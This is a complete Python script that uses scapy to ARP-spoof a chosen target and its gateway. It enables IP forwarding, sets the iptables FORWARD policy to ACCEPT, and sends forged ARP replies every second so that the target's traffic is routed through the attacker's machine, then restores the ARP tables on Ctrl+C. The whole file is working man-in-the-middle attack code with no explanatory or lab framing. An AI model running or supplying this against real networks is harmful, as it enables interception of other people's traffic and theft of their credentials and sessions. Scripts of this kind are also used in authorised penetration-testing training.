#!/usr/bin/env python3

import scapy.all as scapy
import time
import optparse
import subprocess

def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Enter the IP address of target")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Enter the IP address of gateway")

    (options, args) = parser.parse_args()

    if not options.target_ip:
        parser.error("[-]Please provide the target ip address, use--help for more info")

    if not options.gateway_ip:
        parser.error("[-]Please provide gateway ip address, use --help for more info")


    return options


def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
   

        arp_req_broadcast = broadcast/arp_request
        answered = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
        return answered[0][1].hwsrc

    except:
        print("[-]Could not resolve MAC address, please try again")

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.Ether(dst=dst_mac)/scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.sendp(packet, count=4, verbose=False)



print("Setting up environment...")
subprocess.call(['sudo','iptables','--policy','FORWARD', 'ACCEPT'])
with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
    f.write("1")

print("Environment setup complete:")

ips = get_args()

target_ip=ips.target_ip
gateway_ip=ips.gateway_ip
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

packets =0


try:
    while True:
        arp_spoof(target_ip, gateway_ip, target_mac)
        arp_spoof(gateway_ip, target_ip, gateway_mac)
        packets = packets+2
        time.sleep(1)
        print(f"\r[+]Number of packets sent: {packets}", end="")
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("Ctrl+C detected.....restoring arp tables......done...Bye!")
